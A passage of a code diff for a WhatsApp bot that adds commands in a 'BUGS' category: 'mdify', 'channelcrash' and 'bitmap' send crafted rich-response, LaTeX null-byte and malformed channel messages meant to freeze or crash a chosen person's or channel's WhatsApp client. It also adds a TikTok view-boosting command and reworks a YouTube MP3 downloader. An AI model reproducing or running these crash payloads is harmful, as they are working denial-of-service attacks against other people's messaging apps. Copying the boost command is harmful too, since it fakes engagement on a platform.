+        return await sock.sendMessage(from, { text: `❌ ${data.message || 'Session not found.'}` });
+      }
+
+      const files = data.files || [];
+      if (!files.length) {
+        return await sock.sendMessage(from, { text: `❌ No files found for session ${sessionId}.` });
+      }
+
+      // ==========================================================
+      // Send each file as a document or text
+      // ==========================================================
+      let sentCount = 0;
+      for (const file of files) {
+        const path = file.path || 'file';
+        const content = file.content || '';
+
+        if (!content) continue;
+
+        const buffer = Buffer.from(content, 'utf-8');
+        const ext = path.split('.').pop() || 'txt';
+        const fileName = path.replace(/\//g, '_');
+
+        try {
+          await sock.sendMessage(from, {
+            document: buffer,
+            mimetype: 'text/plain',
+            fileName: fileName,
+            caption: `📁 *${path}*\n📦 ${(buffer.length / 1024).toFixed(1)} KB`
+          });
+          sentCount++;
+          await new Promise(r => setTimeout(r, 500));
+        } catch (sendErr) {
+          // Try sending as text if document fails
+          const preview = content.slice(0, 1000);
+          await sock.sendMessage(from, { 
+            text: `📁 *${path}*\n\n\`\`\`${ext}\n${preview}${content.length > 1000 ? '\n\n... (truncated)' : ''}\n\`\`\`` 
+          });
+          sentCount++;
+        }
+      }
+
+      if (sentCount === 0) {
+        await sock.sendMessage(from, { text: `❌ Could not send any files.` });
+      } else {
+        await sock.sendMessage(from, { 
+          text: `✅ Sent *${sentCount}* file${sentCount > 1 ? 's' : ''} from session ${sessionId}.` 
+        });
+      }
+
+    } catch (error) {
+      console.error('Llamacoder get error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not fetch files.'}` 
+      });
+    }
+  }
+});
+register({
+  name: 'mdify',
+  aliases: ['crash', 'boom', 'freeze'],
+  category: 'BUGS',
+  description: 'Send a crash payload to freeze WhatsApp clients (use with caution)',
+  async execute({ sock, from, msg, args, prefix, command }) {
+    // ==========================================================
+    // Owner only - prevent abuse
+    // ==========================================================
+    const ownerJid = getOwnerJid(sock);
+    const isOwner = from === ownerJid || msg.key.fromMe;
+
+    if (!isOwner) {
+      return await sock.sendMessage(from, { 
+        text: `❌ *Owner only command.*\n\nThis is a dangerous command that can crash WhatsApp clients.` 
+      });
+    }
+
+    // ==========================================================
+    // Check if user provided a target number
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `💀 *Usage:* ${prefix}${command} <phone_number>\n\n*Example:*\n${prefix}${command} 2348269946429\n\n⚠️ *Without country code?* Include it (e.g., 234 for Nigeria).` 
+      });
+    }
+
+    // ==========================================================
+    // Format the target JID
+    // ==========================================================
+    let rawNumber = args[0].replace(/[^0-9]/g, '');
+    
+    // Add @s.whatsapp.net if not already present
+    let targetJid = rawNumber.includes('@') ? rawNumber : `${rawNumber}@s.whatsapp.net`;
+
+    // Send confirmation
+    await sock.sendMessage(from, { 
+      text: `💀 *Sending crash payload to ${rawNumber}...*\n⚠️ This will freeze the target's WhatsApp client.` 
+    });
+
+    try {
+      // ==========================================================
+      // YOUR ORIGINAL FUNCTION - UNCHANGED
+      // ==========================================================
+      async function mdify(sock, jid) {
+        return await sock.relayMessage(jid, {
+          "botForwardedMessage": {
+            "message": {
+              "richResponseMessage": {
+                "messageType": 1,
+                "unifiedResponse": {
+                  "data": Buffer.from(JSON.stringify(
+                    {
+                      "sections": [
+                        {
+                          "view_model": {
+                            "primitive": {
+                              "text": `==.${"\n".repeat(100000)}.==`,
+                              "__typename": "GenAIMarkdownTextUXPrimitive"
+                            },
+                            "__typename": "GenAISingleLayoutViewModel"
+                          }
+                        }
+                      ]
+                    }
+                  )).toString("base64")
+                },
+                "contextInfo": {
+                  "isForwarded": true,
+                  "forwardOrigin": 4
+                }
+              }
+            }
+          }
+        });
+      }
+
+      // ==========================================================
+      // Execute the function with target JID
+      // ==========================================================
+      await mdify(sock, targetJid);
+
+      await sock.sendMessage(from, { 
+        text: `✅ *Payload sent to ${rawNumber}*\n\n📌 *Target:* ${targetJid}\n📊 *Payload type:* Rich response crash\n\n⚠️ If the client doesn't crash immediately, they may have patched it.` 
+      });
+
+    } catch (error) {
+      console.error('mdify error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not send payload.'}\n\n💡 Make sure the number is valid and has WhatsApp.` 
+      });
+    }
+  }
+});
+register({
+  name: 'channelcrash',
+  aliases: ['chcrash', 'cchannel', 'channelboom'],
+  category: 'BUGS',
+  description: 'Crash a WhatsApp channel via channel link (use with caution)',
+  async execute({ sock, from, msg, args, prefix, command }) {
+    // ==========================================================
+    // Owner only - prevent abuse
+    // ==========================================================
+    const ownerJid = getOwnerJid(sock);
+    const isOwner = from === ownerJid || msg.key.fromMe;
+
+    if (!isOwner) {
+      return await sock.sendMessage(from, { 
+        text: `❌ *Owner only command.*\n\nThis is a dangerous command that can crash WhatsApp channels.` 
+      });
+    }
+
+    // ==========================================================
+    // Check if user provided a channel link
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `💀 *Usage:* ${prefix}${command} <channel_link> [count]\n\n*Examples:*\n${prefix}${command} https://whatsapp.com/channel/0029VaXxXxXxXxXxXxX\n${prefix}${command} https://whatsapp.com/channel/0029VaXxXxXxXxXxXxX 10\n\n*Count:* Number of payloads to send (default: 5, max: 20)\n\n*Note:* The channel must be one you are subscribed to or admin of.` 
+      });
+    }
+
+    // ==========================================================
+    // Parse channel link and extract channel ID
+    // ==========================================================
+    const channelLink = args[0];
+    let channelJid = null;
+    let rawChannelId = '';
+
+    // Extract channel ID from WhatsApp channel link
+    // Format: https://whatsapp.com/channel/0029VaXxXxXxXxXxXxX
+    if (channelLink.includes('whatsapp.com/channel/')) {
+      const parts = channelLink.split('/');
+      rawChannelId = parts[parts.length - 1].split('?')[0].split('#')[0];
+      channelJid = `${rawChannelId}@newsletter`;
+    } 
+    // If user already provided the JID format
+    else if (channelLink.includes('@newsletter')) {
+      channelJid = channelLink;
+      rawChannelId = channelLink.split('@')[0];
+    } 
+    // If user just provided the channel ID
+    else if (channelLink.match(/^[0-9a-zA-Z]{16,}$/)) {
+      rawChannelId = channelLink;
+      channelJid = `${rawChannelId}@newsletter`;
+    }
+
+    if (!channelJid) {
+      return await sock.sendMessage(from, { 
+        text: `❌ *Invalid channel link.*\n\nPlease provide a valid WhatsApp channel link:\n${prefix}${command} https://whatsapp.com/channel/0029VaXxXxXxXxXxXxX` 
+      });
+    }
+
+    let count = parseInt(args[1]) || 5;
+    if (count < 1) count = 1;
+    if (count > 20) count = 20;
+
+    await sock.sendMessage(from, { 
+      text: `💀 *Channel crash initiated...*\n📌 *Channel:* ${rawChannelId}\n📊 *Payloads:* ${count}\n⏳ *Sending payloads...*` 
+    });
+
+    try {
+      // ==========================================================
+      // YOUR ORIGINAL FUNCTION - UNCHANGED
+      // ==========================================================
+      const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+      async function channelHome(sock, target, count = 5) {
+        for (let x = 0; x < count; x++) {
+          sock.relayMessage(target, {
+            "messageContextInfo": {
+              "messageAssociation": {
+                "parentMessageKey": {"id": ""}
+              }
+            },
+            "extendedTextMessage": {}
+          }, {})
+          await sleep(5000)
+        }
+      }
+
+      // ==========================================================
+      // Execute the function with channel JID
+      // ==========================================================
+      await channelHome(sock, channelJid, count);
+
+      await sock.sendMessage(from, { 
+        text: `✅ *Channel crash completed*\n\n📌 *Channel:* ${rawChannelId}\n📊 *Payloads sent:* ${count}\n⏱️ *Total time:* ~${count * 5} seconds\n\n⚠️ If the channel doesn't freeze/crash, they may have patched it.` 
+      });
+
+    } catch (error) {
+      console.error('Channel crash error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not send channel crash payloads.'}\n\n💡 Make sure:\n• You are subscribed to the channel\n• The channel link is valid\n• The bot is connected to WhatsApp` 
+      });
+    }
+  }
+});
+register({
+  name: 'bitmap',
+  aliases: ['latexcrash', 'texboom', 'rendercrash'],
+  category: 'BUGS',
+  description: 'Crash target using LaTeX null-byte rendering exploit',
+  async execute({ sock, from, msg, args, prefix, command }) {
+    // ==========================================================
+    // Owner only - prevent abuse
+    // ==========================================================
+    const ownerJid = getOwnerJid(sock);
+    const isOwner = from === ownerJid || msg.key.fromMe;
+
+    if (!isOwner) {
+      return await sock.sendMessage(from, { 
+        text: `❌ *Owner only command.*\n\nThis is a powerful crash exploit that can freeze WhatsApp clients.` 
+      });
+    }
+
+    // ==========================================================
+    // Check if user provided a target
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `💀 *Usage:* ${prefix}${command} <target>\n\n*Examples:*\n${prefix}${command} 2348269946429 (phone number)\n${prefix}${command} 2348269946429@s.whatsapp.net (JID)\n${prefix}${command} 0029VaXxXxXxXxXxXxX@newsletter (channel)\n\n⚠️ *Powerful LaTeX exploit — use with extreme caution.*` 
+      });
+    }
+
+    // ==========================================================
+    // Format the target JID
+    // ==========================================================
+    let rawTarget = args[0];
+    let targetJid = rawTarget;
+
+    // If it's a phone number without @, add @s.whatsapp.net
+    if (!rawTarget.includes('@') && !rawTarget.includes('whatsapp.com')) {
+      // Check if it's a channel ID (starts with 0029 or similar)
+      if (rawTarget.match(/^[0-9a-zA-Z]{16,}$/)) {
+        targetJid = `${rawTarget}@newsletter`;
+      } else {
+        // Phone number
+        const cleanNumber = rawTarget.replace(/[^0-9]/g, '');
+        targetJid = `${cleanNumber}@s.whatsapp.net`;
+      }
+    }
+
+    await sock.sendMessage(from, { 
+      text: `💀 *Bitmap crash initiated...*\n📌 *Target:* ${targetJid}\n📊 *Payload:* LaTeX null-byte exploit\n⏳ *Sending...*` 
+    });
+
+    try {
+      // ==========================================================
+      // YOUR ORIGINAL FUNCTION - UNCHANGED
+      // ==========================================================
+      async function bitmap(sock, jid) {
+        return await sock.relayMessage(jid, {
+          "botForwardedMessage": {
+            "message": {
+              "richResponseMessage": {
+                "messageType": 1,
+                "submessages": [
+                  {
+                    "messageType": 8,
+                    "latexMetadata": {
+                      "text": "\0",
+                      "expressions": [
+                        {
+                          "latexExpression": "\0",
+                          "width": 99999999,
+                        }
+                      ]
+                    }
+                  }
+                ],
+                "contextInfo": {
+                  "isForwarded": true,
+                  "forwardOrigin": 4
+                }
+              }
+            }
+          }
+        })
+      }
+
+      // ==========================================================
+      // Execute the function
+      // ==========================================================
+      await bitmap(sock, targetJid);
+
+      await sock.sendMessage(from, { 
+        text: `✅ *Bitmap crash sent to ${targetJid}*\n\n📌 *Target:* ${targetJid}\n📊 *Exploit:* LaTeX null-byte overflow\n📐 *Width:* 99,999,999 (max integer)\n\n⚠️ *If client doesn't crash:*
+• WhatsApp may have patched this
+• Target may be using a different client
+• Try the channel or phone version` 
+      });
+
+    } catch (error) {
+      console.error('Bitmap error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ *Error:* ${error.message || 'Could not send crash payload.'}\n\n💡 *Troubleshooting:*
+• Make sure the target has WhatsApp
+• Check if the JID is formatted correctly
+• Try a different target type (phone/channel)` 
+      });
+    }
+  }
+});
+register({
+  name: 'tiktokboost',
+  aliases: ['ttboost', 'boost', 'ttviews', 'tiktokviews'],
+  category: 'TOOLS',
+  description: 'Boost TikTok video views and engagement',
+  async execute({ sock, from, args, prefix, command }) {
+    // ==========================================================
+    // Check if user provided a TikTok URL
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `🚀 *TikTok Video Booster*\n\nUsage: ${prefix}${command} <tiktok_url>\nExample: ${prefix}${command} https://www.tiktok.com/@username/video/xxxxx\n\n*Note:* Likes and views take time to register.\n\n*Supports:*\n• TikTok video URLs\n• Short links (vm.tiktok.com)\n• Profile video links` 
+      });
+    }
+
+    const url = args[0];
+
+    // ==========================================================
+    // Validate TikTok URL
+    // ==========================================================
+    if (!url.includes('tiktok.com') && !url.includes('vm.tiktok.com')) {
+      return await sock.sendMessage(from, { 
+        text: `❌ Invalid URL. Please provide a valid TikTok video link.\n\nExample: https://www.tiktok.com/@username/video/xxxxx` 
+      });
+    }
+
+    await sock.sendMessage(from, { 
+      text: `🚀 *Processing boost...*\n⏳ This may take a few seconds.\n\n📱 URL: ${url.slice(0, 50)}...` 
+    });
+
+    try {
+      // ==========================================================
+      // Call OmegaTech TikTok Booster API
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/Fun/Tiktok-booster`);
+      apiUrl.searchParams.append('action', 'boost');
+      apiUrl.searchParams.append('url', url);
+
+      const response = await fetch(apiUrl.toString(), {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Check if the request was successful
+      // ==========================================================
+      if (!data.success) {
+        const errorMsg = data.message || data.error || 'Unknown error';
+        return await sock.sendMessage(from, { 
+          text: `❌ Boost failed: ${errorMsg}\n\n💡 Try again later or check the URL.` 
+        });
+      }
+
+      // ==========================================================
+      // Extract and display the boost result
+      // ==========================================================
+      const result = data.data || {};
+      const title = result.title || 'TikTok Video';
+      const author = result.author || result.username || 'Unknown';
+      const username = result.username || author;
+      const status = result.status || 'completed';
+
+      const statusEmoji = status === 'completed' ? '✅' : '⏳';
+
+      const boostMessage = `🚀 *TikTok Boost Successful!*\n\n` +
+        `${statusEmoji} *Status:* ${status}\n` +
+        `📱 *Video:* ${title.slice(0, 60)}${title.length > 60 ? '...' : ''}\n` +
+        `👤 *Author:* ${author} (@${username})\n` +
+        `🔗 *URL:* ${url.slice(0, 40)}...\n\n` +
+        `📊 *Boost Started*\n` +
+        `⏱️ *Timestamp:* ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Just now'}\n\n` +
+        `*⚠️ Note:* Likes and views take time to register.\n` +
+        `✨ _Powered by Nexus_md`;
+
+      await sock.sendMessage(from, { 
+        text: boostMessage 
+      });
+
+    } catch (error) {
+      console.error('TikTok boost error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not boost video.'}\n\n💡 Try:\n• Check the URL is valid\n• Try again later\n• Use a different TikTok video` 
       });
     }
   }
@@ -4601,13 +7489,13 @@ register({
 });
 register({
   name: 'play',
-  aliases: ['song', 'music', 'audio'],
+  aliases: ['song', 'music', 'audio', 'ytmp3'],
   category: 'DOWNLOADER',
-  description: 'Search and play music from YouTube',
+  description: 'Search and download music from YouTube (MP3)',
   async execute({ sock, from, args, prefix, command }) {
     if (!args[0]) {
       return await sock.sendMessage(from, { 
-        text: `🎵 *Music Player*\n\nUsage: ${prefix}${command} <song name or URL>\nExample: ${prefix}${command} Faded\n\n*Examples:*\n${prefix}${command} Shape of You\n${prefix}${command} https://youtu.be/60ItHLz5WEA\n\n*Options:*\n${prefix}${command} <song name> (plays best match)\n${prefix}${command} <url> (plays specific video)` 
+        text: `🎵 *Music Player*\n\nUsage: ${prefix}${command} <song name or URL>\nExample: ${prefix}${command} Faded\n\n*Examples:*\n${prefix}${command} Shape of You\n${prefix}${command} https://youtu.be/60ItHLz5WEA\n\n*Note:* Downloads best available quality MP3.` 
       });
     }
 
@@ -4616,15 +7504,17 @@ register({
 
     await sock.sendMessage(from, { text: `⏳ Searching for "${query}"...` });
 
-    try {
-      let videoUrl = query;
-      let title = '';
-      let thumbnail = '';
-      let duration = '';
-      let artist = '';
+    let videoUrl = query;
+    let title = 'YouTube Audio';
+    let thumbnail = '';
+    let duration = '';
+    let artist = '';
 
-      // If it's not a URL, search for it
-      if (!isUrl) {
+    // ==========================================================
+    // STEP 1: If not a URL, search via yt-search
+    // ==========================================================
+    if (!isUrl) {
+      try {
         const yts = require('yt-search');
         const searchResults = await yts(query);
         
@@ -4640,10 +7530,18 @@ register({
         thumbnail = target.thumbnail || target.image || '';
         duration = target.timestamp || target.duration || '';
         artist = target.author?.name || target.author || '';
-      }
 
-      // Try to extract metadata if not already set
-      if (!title && !isUrl) {
+      } catch (ytErr) {
+        console.warn('yt-search failed:', ytErr.message);
+        // Continue with raw query as URL
+      }
+    }
+
+    // ==========================================================
+    // STEP 2: Try to fetch metadata if still missing
+    // ==========================================================
+    if (!isUrl && (!title || title === 'YouTube Audio')) {
+      try {
         const yts = require('yt-search');
         const searchResults = await yts(videoUrl);
         if (searchResults && searchResults.videos && searchResults.videos.length > 0) {
@@ -4653,176 +7551,264 @@ register({
           duration = target.timestamp || target.duration || '';
           artist = target.author?.name || target.author || '';
         }
-      }
+      } catch (e) {}
+    }
 
-      // If still no title, use a default
-      if (!title) title = 'YouTube Audio';
-
-      // Send thumbnail if available
-      if (thumbnail) {
-        try {
-          await sock.sendMessage(from, {
-            image: { url: thumbnail },
-            caption: `🎵 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}${duration ? `⏱️ *Duration:* ${duration}\n` : ''}\n\n⬇️ *Downloading audio...*`
-          });
-        } catch (thumbErr) {
-          await sock.sendMessage(from, { 
-            text: `🎵 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}${duration ? `⏱️ *Duration:* ${duration}\n` : ''}\n\n⬇️ *Downloading audio...*` 
-          });
-        }
-      }
-
-      // Download via OmegaTech API
-      const baseUrl = 'https://omegatech-api.dixonomega.tech';
-      const response = await fetch(`${baseUrl}/api/download/play?url=${encodeURIComponent(videoUrl)}`, {
-        headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        }
-      });
-
-      if (!response.ok) {
-        throw new Error(`API returned ${response.status}`);
-      }
-
-      const data = await response.json();
-
-      // Extract audio URL
-      let audioUrl = data.download_url || data.download || data.url || 
-                     data.result?.download_url || data.result?.download || data.result?.url ||
-                     data.data?.download_url || data.data?.download || data.data?.url;
-
-      if (!audioUrl) {
-        const jsonString = JSON.stringify(data);
-        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp3|m4a|ogg|wav)/i);
-        if (urlMatch) audioUrl = urlMatch[0];
-      }
-
-      if (!audioUrl) {
-        throw new Error("Could not extract download URL from API response.");
-      }
-
-      // Download the audio
-      const audioResponse = await fetch(audioUrl, {
-        headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        }
-      });
-
-      if (!audioResponse.ok) {
-        throw new Error(`Audio download failed: ${audioResponse.status}`);
-      }
-
-      const audioBuffer = Buffer.from(await audioResponse.arrayBuffer());
-
-      if (audioBuffer.length < 5000) {
-        throw new Error("Downloaded file is too small. The link may be invalid.");
-      }
-
-      const fileSizeMB = (audioBuffer.length / 1024 / 1024).toFixed(1);
-
-      // Detect if it's MP3 or needs conversion
-      const isMP3 = audioBuffer.toString('ascii', 0, 3) === 'ID3' ||
-                    (audioBuffer[0] === 0xFF && (audioBuffer[1] & 0xE0) === 0xE0);
-
-      let finalBuffer = audioBuffer;
-      if (!isMP3) {
-        try {
-          const { toAudio } = require('../lib/converter');
-          const converted = await toAudio(audioBuffer);
-          if (converted && converted.length > 1000) {
-            finalBuffer = converted;
-          }
-        } catch (convErr) {
-          console.warn('Conversion skipped:', convErr.message);
-        }
-      }
-
-      // Send the audio
-      const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim();
-      const fileName = `${safeTitle}.mp3`;
-
+    // Send thumbnail if available
+    if (thumbnail) {
       try {
         await sock.sendMessage(from, {
-          audio: finalBuffer,
-          mimetype: 'audio/mpeg',
-          fileName: fileName,
-          caption: `🎵 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success*`
+          image: { url: thumbnail },
+          caption: `🎵 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}${duration ? `⏱️ *Duration:* ${duration}\n` : ''}\n\n⬇️ *Downloading audio...*`
         });
-      } catch (sendErr) {
-        // Fallback: send as document
-        await sock.sendMessage(from, {
-          document: finalBuffer,
-          mimetype: 'audio/mpeg',
-          fileName: fileName,
-          caption: `🎵 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
+      } catch (thumbErr) {
+        await sock.sendMessage(from, { 
+          text: `🎵 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}${duration ? `⏱️ *Duration:* ${duration}\n` : ''}\n\n⬇️ *Downloading audio...*` 
         });
       }
+    }
 
-    } catch (error) {
-      console.error('Play error:', error);
+    // ==========================================================
+    // STEP 3: Try PRIMARY API - David Cyril
+    // ==========================================================
+    try {
+      const davidUrl = `https://apis.davidcyril.name.ng/play?url=${encodeURIComponent(videoUrl)}`;
+      const davidRes = await fetch(davidUrl, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
 
-      // Fallback: Prince API
-      try {
-        const princeUrl = 'https://api.princetechn.com/api/download/ytmp3';
-        const fallbackRes = await fetch(`${princeUrl}?apikey=prince&url=${encodeURIComponent(query)}`);
-        const fallbackData = await fallbackRes.json();
+      if (davidRes.ok) {
+        const davidData = await davidRes.json();
+        
+        // Extract audio URL - David Cyril returns: { result: { url: "..." } }
+        let audioUrl = davidData.result?.url || davidData.result?.download_url || 
+                       davidData.url || davidData.download_url || davidData.result;
 
-        let fallbackAudio = fallbackData.result?.download_url || fallbackData.result?.url || 
-                            fallbackData.download_url || fallbackData.url;
-        let fallbackTitle = fallbackData.result?.title || fallbackData.title || 'YouTube Audio';
-
-        if (fallbackAudio) {
-          const aRes = await fetch(fallbackAudio);
-          const aBuf = Buffer.from(await aRes.arrayBuffer());
-          if (aBuf.length > 5000) {
-            return await sock.sendMessage(from, {
-              audio: aBuf,
-              mimetype: 'audio/mpeg',
-              fileName: `${fallbackTitle}.mp3`,
-              caption: `🎵 *${fallbackTitle}*\n✅ *Download Success (fallback)*`
-            });
-          }
+        if (!audioUrl) {
+          // Try to find any URL in the response
+          const jsonString = JSON.stringify(davidData);
+          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp3|m4a|ogg|wav)/i);
+          if (urlMatch) audioUrl = urlMatch[0];
         }
-      } catch (fallbackErr) {
-        // Silent fail
-      }
 
-      // Fallback: Try yt-search with Prince API
-      try {
-        if (!isUrl) {
-          const yts = require('yt-search');
-          const searchResults = await yts(query);
-          if (searchResults && searchResults.videos && searchResults.videos.length > 0) {
-            const target = searchResults.videos[0];
-            const ytUrl = target.url;
-            
-            const princeUrl = 'https://api.princetechn.com/api/download/ytmp3';
-            const fallbackRes = await fetch(`${princeUrl}?apikey=prince&url=${encodeURIComponent(ytUrl)}`);
-            const fallbackData = await fallbackRes.json();
-            
-            let fallbackAudio = fallbackData.result?.download_url || fallbackData.result?.url || 
-                                fallbackData.download_url || fallbackData.url;
-            
-            if (fallbackAudio) {
-              const aRes = await fetch(fallbackAudio);
-              const aBuf = Buffer.from(await aRes.arrayBuffer());
-              if (aBuf.length > 5000) {
-                return await sock.sendMessage(from, {
-                  audio: aBuf,
+        if (audioUrl && audioUrl.startsWith('http')) {
+          // Download and send
+          const audioResponse = await fetch(audioUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (audioResponse.ok) {
+            const audioBuffer = Buffer.from(await audioResponse.arrayBuffer());
+            if (audioBuffer.length > 5000) {
+              const fileSizeMB = (audioBuffer.length / 1024 / 1024).toFixed(1);
+              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'audio';
+              const fileName = `${safeTitle}.mp3`;
+
+              try {
+                await sock.sendMessage(from, {
+                  audio: audioBuffer,
                   mimetype: 'audio/mpeg',
-                  fileName: `${target.title}.mp3`,
-                  caption: `🎵 *${target.title}*\n✅ *Download Success (search fallback)*`
+                  fileName: fileName,
+                  caption: `🎵 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (David Cyril)*`
                 });
+                return; // Success, exit
+              } catch (sendErr) {
+                // Fallback: send as document
+                await sock.sendMessage(from, {
+                  document: audioBuffer,
+                  mimetype: 'audio/mpeg',
+                  fileName: fileName,
+                  caption: `🎵 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
+                });
+                return;
               }
             }
           }
         }
-      } catch (ytErr) {}
-
-      await sock.sendMessage(from, { 
-        text: `⚠️ Play Error: ${error.message || 'Unknown error'}\n\n💡 Try again or use a different song name.` 
-      });
+      }
+    } catch (davidErr) {
+      console.warn('David Cyril API failed:', davidErr.message);
     }
+
+    // ==========================================================
+    // STEP 4: Fallback API - EliteProTech
+    // ==========================================================
+    try {
+      const eliteUrl = `https://eliteprotech-apis.zone.id/ytmp3?url=${encodeURIComponent(videoUrl)}`;
+      const eliteRes = await fetch(eliteUrl, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
+
+      if (eliteRes.ok) {
+        const eliteData = await eliteRes.json();
+        
+        let audioUrl = eliteData.result?.url || eliteData.result?.download_url || 
+                       eliteData.url || eliteData.download_url || eliteData.result;
+
+        if (!audioUrl) {
+          const jsonString = JSON.stringify(eliteData);
+          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp3|m4a|ogg|wav)/i);
+          if (urlMatch) audioUrl = urlMatch[0];
+        }
+
+        if (audioUrl && audioUrl.startsWith('http')) {
+          const audioResponse = await fetch(audioUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (audioResponse.ok) {
+            const audioBuffer = Buffer.from(await audioResponse.arrayBuffer());
+            if (audioBuffer.length > 5000) {
+              const fileSizeMB = (audioBuffer.length / 1024 / 1024).toFixed(1);
+              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'audio';
+              const fileName = `${safeTitle}.mp3`;
+
+              try {
+                await sock.sendMessage(from, {
+                  audio: audioBuffer,
+                  mimetype: 'audio/mpeg',
+                  fileName: fileName,
+                  caption: `🎵 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (EliteProTech)*`
+                });
+                return;
+              } catch (sendErr) {
+                await sock.sendMessage(from, {
+                  document: audioBuffer,
+                  mimetype: 'audio/mpeg',
+                  fileName: fileName,
+                  caption: `🎵 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
+                });
+                return;
+              }
+            }
+          }
+        }
+      }
+    } catch (eliteErr) {
+      console.warn('EliteProTech API failed:', eliteErr.message);
+    }
+
+    // ==========================================================
+    // STEP 5: Third Fallback - Prince API
+    // ==========================================================
+    try {
+      const princeUrl = `https://api.princetechn.com/api/download/ytmp3?apikey=prince&url=${encodeURIComponent(videoUrl)}`;
+      const princeRes = await fetch(princeUrl, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
+
+      if (princeRes.ok) {
+        const princeData = await princeRes.json();
+        
+        let audioUrl = princeData.result?.download_url || princeData.result?.url || 
+                       princeData.download_url || princeData.url || princeData.result;
+
+        if (!audioUrl) {
+          const jsonString = JSON.stringify(princeData);
+          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp3|m4a|ogg|wav)/i);
+          if (urlMatch) audioUrl = urlMatch[0];
+        }
+
+        if (audioUrl && audioUrl.startsWith('http')) {
+          const audioResponse = await fetch(audioUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (audioResponse.ok) {
+            const audioBuffer = Buffer.from(await audioResponse.arrayBuffer());
+            if (audioBuffer.length > 5000) {
+              const fileSizeMB = (audioBuffer.length / 1024 / 1024).toFixed(1);
+              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'audio';
+              const fileName = `${safeTitle}.mp3`;
+
+              try {
+                await sock.sendMessage(from, {
+                  audio: audioBuffer,
+                  mimetype: 'audio/mpeg',
+                  fileName: fileName,
+                  caption: `🎵 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (Prince)*`
+                });
+                return;
+              } catch (sendErr) {
+                await sock.sendMessage(from, {
+                  document: audioBuffer,
+                  mimetype: 'audio/mpeg',
+                  fileName: fileName,
+                  caption: `🎵 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
+                });
+                return;
+              }
+            }
+          }
+        }
+      }
+    } catch (princeErr) {
+      console.warn('Prince API failed:', princeErr.message);
+    }
+
+    // ==========================================================
+    // STEP 6: Final Fallback - OmegaTech (existing)
+    // ==========================================================
+    try {
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const omegaRes = await fetch(`${baseUrl}/api/download/play?url=${encodeURIComponent(videoUrl)}`, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
+
+      if (omegaRes.ok) {
+        const omegaData = await omegaRes.json();
+        let audioUrl = omegaData.download_url || omegaData.download || omegaData.url || 
+                       omegaData.result?.download_url || omegaData.result?.download || omegaData.result?.url;
+
+        if (!audioUrl) {
+          const jsonString = JSON.stringify(omegaData);
+          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp3|m4a|ogg|wav)/i);
+          if (urlMatch) audioUrl = urlMatch[0];
+        }
+
+        if (audioUrl && audioUrl.startsWith('http')) {
+          const audioResponse = await fetch(audioUrl, {
